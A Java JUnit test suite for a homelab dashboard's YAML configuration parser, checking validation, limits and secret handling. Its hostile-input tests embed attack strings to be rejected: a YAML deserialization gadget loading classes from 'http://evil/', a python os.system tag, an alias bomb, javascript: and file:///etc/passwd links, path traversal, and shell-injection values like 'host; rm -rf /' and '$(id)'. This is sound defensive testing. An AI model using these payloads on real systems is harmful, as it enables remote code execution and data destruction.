package com.homelabhub.internal.config;

import static org.assertj.core.api.Assertions.assertThat;

import com.homelabhub.internal.config.DashboardConfig.*;
import java.util.Set;
import java.util.stream.Collectors;
import org.junit.jupiter.api.Test;

class ConfigParserTest {

    static final String VALID = """
            version: 1
            title: "Tabish's Homelab"
            theme: {mode: auto}
            defaults: {status: auto, interval: 30}
            widgets:
              - resources: {cpu: true, memory: true, disk: /, cputemp: true, uptime: true, network: true}
              - search: {provider: google}
            pinned: [wake-pve, lxc-100]
            groups:
              - name: Proxmox
                items:
                  - name: Proxmox VE
                    href: https://proxmox-pve.example-tailnet.ts.net
                    icon: proxmox.svg
                    status: {icmp: 192.168.10.102}
                    widget: {type: proxmox, url: "https://192.168.10.102:8006", node: pve, username: "hub@pve!homepage", password: "${secret:PVE_PASSWORD}", tls: insecure}
                  - name: Raspberry Pi
                    items:
                      - {name: Grafana, href: "http://192.168.10.101:3000/", icon: grafana.png, status: {tcp: "192.168.10.101:3000"}}
            actions:
              - {id: wake-pve, label: Wake Proxmox, type: wol, mac: "aa:bb:cc:dd:ee:01", status: {icmp: 192.168.10.102}}
              - {id: pve-shutdown, label: Shutdown Proxmox, type: proxmox-node, node: pve, command: shutdown}
              - {id: lxc-100, label: Apps LXC, type: proxmox-guest, node: pve, kind: lxc, vmid: 100}
            """;

    private final ConfigParser parser = new ConfigParser(name -> name.equals("PVE_PASSWORD"));

    private ConfigParser.Result parse(String yaml) {
        return parser.parse(yaml);
    }

    private static Set<String> errorPaths(ConfigParser.Result r) {
        return r.errors().stream().map(Issue::path).collect(Collectors.toSet());
    }

    private static String replace(String from, String to) {
        assertThat(VALID).contains(from);
        return VALID.replace(from, to);
    }

    // ---------------------------------------------------------------- the good case

    @Test
    void aValidDashboardParsesWithoutErrors() {
        var r = parse(VALID);
        assertThat(r.ok()).as(r.issues().toString()).isTrue();
        DashboardConfig c = r.config();
        assertThat(c.title()).isEqualTo("Tabish's Homelab");
        assertThat(c.defaults().autoStatus()).isTrue();
        assertThat(c.widgets()).extracting(InfoWidget::type).containsExactly("resources", "search");
        assertThat(c.pinned()).containsExactly("wake-pve", "lxc-100");
        Group proxmox = c.groups().get(0);
        assertThat(proxmox.id()).isEqualTo("g0");
        Item pve = (Item) proxmox.entries().get(0);
        assertThat(pve.id()).isEqualTo("g0.0");
        assertThat(pve.status().kind()).isEqualTo(StatusCheck.Kind.ICMP);
        assertThat(pve.widget().type()).isEqualTo("proxmox");
        assertThat(pve.widget().options()).containsEntry("password", "${secret:PVE_PASSWORD}");
        Group pi = (Group) proxmox.entries().get(1);
        assertThat(pi.entries()).hasSize(1);
        assertThat(((Item) pi.entries().get(0)).status().target()).isEqualTo("192.168.10.101:3000");
    }

    @Test
    void actionsGetNormalisedValuesAndSensibleDefaults() {
        var c = parse(VALID).config();
        WolAction wake = (WolAction) c.actions().get(0);
        assertThat(wake.mac()).isEqualTo("AA:BB:CC:DD:EE:01");
        assertThat(wake.confirm()).isEqualTo(Confirm.CLICK);
        assertThat(((NodeAction) c.actions().get(1)).confirm()).isEqualTo(Confirm.TYPE_NAME);
        GuestAction g = (GuestAction) c.actions().get(2);
        assertThat(g.confirm()).isEqualTo(Confirm.AUTO);
        assertThat(g.stopMode()).as("hard stop stays the default (decision D13)").isEqualTo("stop");
    }

    @Test
    void anUnsetSecretIsOnlyAWarningAndASetOneIsSilent() {
        var quiet = parse(VALID);
        assertThat(quiet.issues()).noneMatch(i -> i.message().contains("Secret"));
        var loud = new ConfigParser(n -> false).parse(VALID);
        assertThat(loud.ok()).isTrue();
        assertThat(loud.issues()).anySatisfy(i -> {
            assertThat(i.level()).isEqualTo(Issue.Level.WARNING);
            assertThat(i.message()).contains("PVE_PASSWORD");
        });
    }

    @Test
    void yamlOneDotOneLookalikesStayStrings() {
        String y = replace("name: Proxmox VE", "name: No").replace("name: Proxmox\n", "name: on\n");
        var c = parse(y).config();
        assertThat(c.groups().get(0).name()).isEqualTo("on");
        assertThat(c.groups().get(0).entries().get(0).name()).isEqualTo("No");
        var d = parse(replace("name: Proxmox VE", "name: 2026-01-01")).config();
        assertThat(d.groups().get(0).entries().get(0).name()).isEqualTo("2026-01-01");
        var n = parse(replace("name: Proxmox VE", "name: 007")).config();
        assertThat(n.groups().get(0).entries().get(0).name()).isEqualTo("007");
    }

    @Test
    void anEmptyGroupListIsFineAndUnknownKeysAreWarningsOnly() {
        var r = parse("version: 1\ngroups: []\nmystery: 1\n");
        assertThat(r.ok()).isTrue();
        assertThat(r.issues()).singleElement().satisfies(i -> {
            assertThat(i.level()).isEqualTo(Issue.Level.WARNING);
            assertThat(i.path()).isEqualTo("mystery");
            assertThat(i.line()).isEqualTo(3);
        });
    }

    @Test
    void relativeLinksAndIconVariantsAreAccepted() {
        String y = replace("href: https://proxmox-pve.example-tailnet.ts.net", "href: /portfolio").replace("icon: proxmox.svg", "icon: mdi-home-assistant");
        assertThat(parse(y).ok()).isTrue();
        assertThat(parse(replace("icon: proxmox.svg", "icon: /images/profile.jpg")).ok()).isTrue();
        assertThat(parse(replace("icon: proxmox.svg", "icon: \"https://cdn.example/x.svg\"")).ok()).isTrue();
    }

    // ---------------------------------------------------------------- file level problems

    @Test
    void emptyBlankAndWrongShapedFilesAreErrorsNotCrashes() {
        for (String bad : new String[] {"", "   \n", "# only a comment\n", "- a\n- b\n", "just text"}) {
            var r = parse(bad);
            assertThat(r.ok()).as("input: [%s]", bad).isFalse();
            assertThat(r.config()).isNull();
        }
    }

    @Test
    void syntaxErrorsReportTheLine() {
        var r = parse("version: 1\ngroups:\n  - name: A\n    items: [\n");
        assertThat(r.ok()).isFalse();
        assertThat(r.errors()).singleElement().satisfies(i -> {
            assertThat(i.message()).startsWith("YAML syntax error");
            assertThat(i.line()).isGreaterThan(0);
        });
        var tabs = parse("version: 1\ngroups:\n\t- name: A\n");
        assertThat(tabs.ok()).isFalse();
    }

    @Test
    void versionAndGroupsAreRequired() {
        assertThat(errorPaths(parse("groups: []\n"))).contains("version");
        assertThat(errorPaths(parse("version: 2\ngroups: []\n"))).contains("version");
        assertThat(errorPaths(parse("version: 1\n"))).contains("groups");
        assertThat(errorPaths(parse("version: 1\ngroups: nope\n"))).contains("groups");
    }

    @Test
    void duplicateKeysAreReportedWithTheirLine() {
        var r = parse("version: 1\ngroups: []\ngroups: []\n");
        assertThat(r.errors()).anySatisfy(i -> {
            assertThat(i.message()).contains("Duplicate key 'groups'");
            assertThat(i.line()).isEqualTo(3);
        });
    }

    @Test
    void anErrorCarriesTheLineOfTheOffendingValue() {
        var r = parse(replace("href: https://proxmox-pve.example-tailnet.ts.net", "href: javascript:alert(1)"));
        Issue i = r.errors().get(0);
        assertThat(i.path()).isEqualTo("groups[0].items[0].href");
        assertThat(i.line()).isEqualTo(VALID.lines().toList().indexOf("        href: https://proxmox-pve.example-tailnet.ts.net") + 1);
    }

    // ---------------------------------------------------------------- hostile YAML

    @Test
    void yamlTagsCannotConstructObjects() {
        var r = parse("version: 1\ngroups: []\nx: !!python/object/apply:os.system [\"id\"]\n");
        assertThat(r.ok()).isFalse();
        // SnakeYAML itself refuses global tags at parse time, before our own tag check is even reached.
        assertThat(r.errors()).anySatisfy(i -> assertThat(i.message()).containsIgnoringCase("tag"));
        var java = parse("version: 1\ngroups: []\nx: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://evil/\"]]]]\n");
        assertThat(java.ok()).isFalse();
    }

    @Test
    void aliasesAndAnchorsAreRefusedSoThereIsNoBillionLaughs() {
        var r = parse("version: 1\ngroups: []\na: &a [1,2,3]\nb: *a\n");
        assertThat(r.ok()).isFalse();
        StringBuilder bomb = new StringBuilder("version: 1\ngroups: []\nl0: &l0 [x,x,x,x,x,x,x,x,x]\n");
        for (int i = 1; i < 10; i++) {
            bomb.append("l").append(i).append(": &l").append(i).append(" [")
                    .append(("*l" + (i - 1) + ",").repeat(9)).append("]\n");
        }
        long t0 = System.nanoTime();
        assertThat(parse(bomb.toString()).ok()).isFalse();
        assertThat((System.nanoTime() - t0) / 1_000_000).as("must fail fast, not expand").isLessThan(2000);
    }

    @Test
    void mergeKeysAreRefused() {
        assertThat(parse("version: 1\ngroups: []\nx: {<<: {a: 1}}\n").ok()).isFalse();
    }

    @Test
    void deepNestingAndHugeFilesAreRejectedCleanly() {
        String deep = "version: 1\ngroups: []\nx: " + "[".repeat(200) + "]".repeat(200) + "\n";
        assertThat(parse(deep).ok()).isFalse();
        String big = "version: 1\ngroups: []\n# " + "a".repeat(YamlTree.MAX_CHARS) + "\n";
        var r = parse(big);
        assertThat(r.ok()).isFalse();
        assertThat(r.errors().get(0).message()).contains("larger than");
    }

    // ---------------------------------------------------------------- links, icons, text

    @Test
    void onlyHttpLinksAreAccepted() {
        for (String bad : new String[] {"javascript:alert(1)", "JavaScript:alert(1)", "data:text/html,<script>1</script>", "file:///etc/passwd",
                "//evil.example/x", "ftp://host/x", "vbscript:x", "https://user:pw@host/x", "http://", "not a url", "\\\\host\\share"}) {
            var r = parse(replace("href: https://proxmox-pve.example-tailnet.ts.net", "href: \"" + bad.replace("\\", "\\\\") + "\""));
            assertThat(errorPaths(r)).as("href %s", bad).contains("groups[0].items[0].href");
        }
    }

    @Test
    void badIconsAreRejected() {
        for (String bad : new String[] {"../../etc/passwd", "a b", "javascript:alert(1)", "<img src=x>", "-lead"}) {
            var r = parse(replace("icon: proxmox.svg", "icon: \"" + bad + "\""));
            assertThat(errorPaths(r)).as("icon %s", bad).contains("groups[0].items[0].icon");
        }
    }

    @Test
    void textFieldsRejectControlCharactersAndAbsurdLengths() {
        assertThat(errorPaths(parse(replace("name: Proxmox VE", "name: \"a\\u0007b\"")))).contains("groups[0].items[0].name");
        assertThat(errorPaths(parse(replace("name: Proxmox VE", "name: " + "x".repeat(81))))).contains("groups[0].items[0].name");
        assertThat(errorPaths(parse(replace("name: Proxmox VE", "name: \"\"")))).contains("groups[0].items[0].name");
    }

    @Test
    void htmlInNamesIsKeptAsPlainTextForTheUiToEscape() {
        var c = parse(replace("name: Proxmox VE", "name: \"<b>x</b>\"")).config();
        assertThat(c.groups().get(0).entries().get(0).name()).isEqualTo("<b>x</b>");
    }

    // ---------------------------------------------------------------- credentials

    @Test
    void aLiteralPasswordIsAnErrorEverywhere() {
        var r = parse(replace("password: \"${secret:PVE_PASSWORD}\"", "password: hunter2"));
        assertThat(r.ok()).isFalse();
        assertThat(r.errors()).anySatisfy(i -> {
            assertThat(i.path()).isEqualTo("groups[0].items[0].widget.password");
            assertThat(i.message()).contains("secrets.env");
        });
    }

    @Test
    void tokenApiKeyAndSecretKeysAreCaughtEvenInUnknownPlaces() {
        for (String key : new String[] {"token", "apiKey", "api_key", "secret", "Password", "passphrase"}) {
            var r = parse("version: 1\ngroups: []\nsomething:\n  nested:\n    " + key + ": abc123\n");
            assertThat(errorPaths(r)).as(key).contains("something.nested." + key);
        }
        assertThat(parse("version: 1\ngroups: []\nsomething:\n  token: \"${secret:MY_TOKEN}\"\n").ok()).isTrue();
        assertThat(parse("version: 1\ngroups: []\ntoken: [a, b]\n").ok()).isFalse();
    }

    @Test
    void malformedSecretReferencesAreErrors() {
        for (String ref : new String[] {"${secret:}", "${secret:1BAD}", "${secret:has space}", "${secret:a-b}"}) {
            var r = parse(replace("node: pve, username", "node: pve, description: \"" + ref + "\", username"));
            assertThat(r.errors()).as(ref).anySatisfy(i -> assertThat(i.message()).contains("Malformed secret reference"));
        }
    }

    // ---------------------------------------------------------------- status checks (ICMP goes to a process!)

    @Test
    void icmpTargetsThatCouldBeReadAsOptionsOrShellAreRefused() {
        for (String bad : new String[] {"-f", "--help", "-c100", "host; rm -rf /", "1.2.3.4 -c 100", "$(id)", "a`b`", "host name", "..", "-", "a|b", "host\\nx"}) {
            var r = parse(replace("status: {icmp: 192.168.10.102}", "status: {icmp: \"" + bad + "\"}"));
            assertThat(errorPaths(r)).as("icmp %s", bad).contains("groups[0].items[0].status.icmp");
        }
        for (String ok : new String[] {"192.168.10.102", "pi.local", "fe80::1", "my-host.example.com"}) {
            assertThat(parse(replace("status: {icmp: 192.168.10.102}", "status: {icmp: \"" + ok + "\"}")).ok()).as(ok).isTrue();
        }
    }

    @Test
    void tcpAndHttpChecksAreValidated() {
        for (String bad : new String[] {"host", "host:0", "host:70000", "host:abc", ":80", "-x:80", "a b:80"}) {
            var r = parse(replace("status: {tcp: \"192.168.10.101:3000\"}", "status: {tcp: \"" + bad + "\"}"));
            assertThat(errorPaths(r)).as("tcp %s", bad).contains("groups[0].items[1].items[0].status.tcp");
        }
        assertThat(parse(replace("status: {icmp: 192.168.10.102}", "status: {http: \"http://x:8080/health\", expect: 200-399, tls: system}")).ok()).isTrue();
        assertThat(errorPaths(parse(replace("status: {icmp: 192.168.10.102}", "status: {http: \"file:///x\"}")))).contains("groups[0].items[0].status.http");
        assertThat(errorPaths(parse(replace("status: {icmp: 192.168.10.102}", "status: {http: \"http://x\", expect: 99}")))).contains("groups[0].items[0].status.expect");
        assertThat(errorPaths(parse(replace("status: {icmp: 192.168.10.102}", "status: {http: \"http://x\", expect: 400-200}")))).contains("groups[0].items[0].status.expect");
    }

    @Test
    void aStatusCheckNeedsExactlyOneKind() {
        assertThat(errorPaths(parse(replace("status: {icmp: 192.168.10.102}", "status: {icmp: 1.2.3.4, tcp: \"1.2.3.4:80\"}")))).contains("groups[0].items[0].status");
        assertThat(errorPaths(parse(replace("status: {icmp: 192.168.10.102}", "status: {}")))).contains("groups[0].items[0].status");
    }

    // ---------------------------------------------------------------- widgets

    @Test
    void widgetProblemsAreReportedPerField() {
        assertThat(errorPaths(parse(replace("type: proxmox,", "type: plex,")))).contains("groups[0].items[0].widget.type");
        assertThat(errorPaths(parse(replace("url: \"https://192.168.10.102:8006\"", "url: \"ftp://x\"")))).contains("groups[0].items[0].widget.url");
        assertThat(errorPaths(parse(replace("tls: insecure", "tls: pinned")))).contains("groups[0].items[0].widget.tls");
        assertThat(errorPaths(parse(replace("tls: insecure", "tls: pinned, fingerprint: abc")))).contains("groups[0].items[0].widget.fingerprint");
        assertThat(errorPaths(parse(replace("node: pve, username", "node: \"../x\", username")))).contains("groups[0].items[0].widget.node");
        assertThat(errorPaths(parse(replace(", password: \"${secret:PVE_PASSWORD}\"", "")))).contains("groups[0].items[0].widget.password");
        assertThat(errorPaths(parse(replace("node: pve, username", "username")))).contains("groups[0].items[0].widget.node");
    }

    @Test
    void aPinnedWidgetWithAGoodFingerprintIsAccepted() {
        String fp = "AA:".repeat(31) + "AA";
        assertThat(parse(replace("tls: insecure", "tls: pinned, fingerprint: \"" + fp + "\"")).ok()).isTrue();
    }

    @Test
    void infoWidgetsAreValidated() {
        assertThat(errorPaths(parse(replace("- search: {provider: google}", "- search: {provider: yahoo}")))).contains("widgets[1].search.provider");
        assertThat(errorPaths(parse(replace("- search: {provider: google}", "- clock: {}")))).contains("widgets[1].clock");
        assertThat(errorPaths(parse(replace("- search: {provider: google}", "- {search: {}, resources: {}}")))).contains("widgets[1]");
        assertThat(errorPaths(parse(replace("disk: /,", "disk: relative/path,")))).contains("widgets[0].resources.disk");
        assertThat(errorPaths(parse(replace("disk: /,", "disk: /a/../etc,")))).contains("widgets[0].resources.disk");
        assertThat(errorPaths(parse(replace("cpu: true", "cpu: maybe")))).contains("widgets[0].resources.cpu");
        assertThat(parse(replace("cpu: true", "cpu: yes")).ok()).isTrue();
    }

    // ---------------------------------------------------------------- actions

    @Test
    void actionProblemsAreReportedPerField() {
        assertThat(errorPaths(parse(replace("id: wake-pve,", "id: Wake_PVE,")))).contains("actions[0].id");
        assertThat(errorPaths(parse(replace("id: pve-shutdown,", "id: wake-pve,")))).contains("actions[1].id");
        assertThat(errorPaths(parse(replace("mac: \"aa:bb:cc:dd:ee:01\"", "mac: \"nope\"")))).contains("actions[0].mac");
        assertThat(errorPaths(parse(replace("node: pve, command: shutdown", "node: \"../etc\", command: shutdown")))).contains("actions[1].node");
        assertThat(errorPaths(parse(replace("command: shutdown", "command: wipe")))).contains("actions[1].command");
        assertThat(errorPaths(parse(replace("vmid: 100", "vmid: 0")))).contains("actions[2].vmid");
        assertThat(errorPaths(parse(replace("vmid: 100", "vmid: -5")))).contains("actions[2].vmid");
        assertThat(errorPaths(parse(replace("vmid: 100", "vmid: abc")))).contains("actions[2].vmid");
        assertThat(errorPaths(parse(replace(", vmid: 100", "")))).contains("actions[2].vmid");
        assertThat(errorPaths(parse(replace("kind: lxc", "kind: docker")))).contains("actions[2].kind");
        assertThat(errorPaths(parse(replace("type: wol", "type: rm")))).contains("actions[0].type");
    }

    @Test
    void confirmNoneIsOnlyForWakeOnLan() {
        assertThat(parse(replace("type: wol,", "type: wol, confirm: none,")).ok()).isTrue();
        assertThat(errorPaths(parse(replace("command: shutdown", "command: shutdown, confirm: none")))).contains("actions[1].confirm");
        assertThat(errorPaths(parse(replace("kind: lxc", "kind: lxc, confirm: none")))).contains("actions[2].confirm");
        assertThat(parse(replace("kind: lxc", "kind: lxc, stop_mode: shutdown, confirm: type-name")).config().actions().get(2)).isInstanceOf(GuestAction.class);
    }

    @Test
    void pinnedMustPointAtRealActions() {
        assertThat(errorPaths(parse(replace("pinned: [wake-pve, lxc-100]", "pinned: [wake-pve, ghost]")))).contains("pinned[1]");
        assertThat(errorPaths(parse(replace("pinned: [wake-pve, lxc-100]", "pinned: [" + "wake-pve,".repeat(13) + "wake-pve]")))).contains("pinned");
    }

    // ---------------------------------------------------------------- limits

    @Test
    void groupNestingIsCapped() {
        StringBuilder y = new StringBuilder("version: 1\ngroups:\n  - name: L0\n    items:\n");
        String indent = "      ";
        for (int d = 1; d <= 5; d++) {
            y.append(indent).append("- name: L").append(d).append("\n").append(indent).append("  items:\n");
            indent += "    ";
        }
        y.append(indent.substring(0, indent.length() - 2)).append("  []\n");
        var r = parse(y.toString().replace("items:\n" + indent.substring(0, indent.length() - 2) + "  []", "items: []"));
        assertThat(r.errors()).anySatisfy(i -> assertThat(i.message()).contains("nested at most"));
    }

    @Test
    void theItemCountIsCapped() {
        StringBuilder y = new StringBuilder("version: 1\ngroups:\n  - name: Big\n    items:\n");
        for (int i = 0; i < 501; i++) {
            y.append("      - {name: i").append(i).append("}\n");
        }
        var r = parse(y.toString());
        assertThat(r.ok()).isFalse();
        assertThat(r.errors()).anySatisfy(i -> assertThat(i.message()).contains("At most 500 items"));
        assertThat(parse(y.toString().replace("      - {name: i500}\n", "")).ok()).isTrue();
    }

    @Test
    void duplicateItemNamesInOneGroupAreOnlyAWarning() {
        var r = parse("version: 1\ngroups:\n  - name: A\n    items:\n      - {name: X}\n      - {name: x}\n");
        assertThat(r.ok()).isTrue();
        assertThat(r.issues()).anySatisfy(i -> assertThat(i.message()).contains("also called"));
    }

    @Test
    void intervalMustBeSane() {
        assertThat(errorPaths(parse("version: 1\ngroups: []\ndefaults: {interval: 1}\n"))).contains("defaults.interval");
        assertThat(errorPaths(parse("version: 1\ngroups: []\ndefaults: {interval: 99999}\n"))).contains("defaults.interval");
        assertThat(errorPaths(parse("version: 1\ngroups: []\ndefaults: {status: maybe}\n"))).contains("defaults.status");
    }

    @Test
    void itNeverThrowsOnRandomGarbage() {
        java.util.Random rnd = new java.util.Random(42);
        String alphabet = "abc:-[]{}\n  \"'#&*!|>,?%@`\t0123456789";
        for (int n = 0; n < 2000; n++) {
            StringBuilder sb = new StringBuilder("version: 1\n");
            for (int i = rnd.nextInt(200); i > 0; i--) {
                sb.append(alphabet.charAt(rnd.nextInt(alphabet.length())));
            }
            var r = parser.parse(sb.toString());
            assertThat(r).isNotNull();
            assertThat(r.issues()).isNotNull();
        }
    }

    @Test
    void anItemCanBeAButtonForAnAction() {
        String y = replace("- {name: Grafana, href: \"http://192.168.10.101:3000/\", icon: grafana.png, status: {tcp: \"192.168.10.101:3000\"}}",
                "- {name: Wake Proxmox, action: wake-pve}");
        var r = parse(y);
        assertThat(r.ok()).as(r.issues().toString()).isTrue();
        Group pi = (Group) r.config().groups().get(0).entries().get(1);
        assertThat(((Item) pi.entries().get(0)).action()).isEqualTo("wake-pve");
    }

    @Test
    void anItemPointingAtAMissingActionIsAnErrorAndHrefPlusActionIsAWarning() {
        var bad = parse(replace("- {name: Grafana, href: \"http://192.168.10.101:3000/\"", "- {name: G, action: ghost, href: \"http://x\""));
        assertThat(errorPaths(bad)).contains("groups[0].items[1].items[0].action");
        assertThat(bad.issues()).anySatisfy(i -> assertThat(i.message()).contains("'href' is ignored"));
        assertThat(errorPaths(parse(replace("- {name: Grafana, href: \"http://192.168.10.101:3000/\"", "- {name: G, action: \"Bad Id!\", href: \"http://x\"")))).isNotEmpty();
    }
}
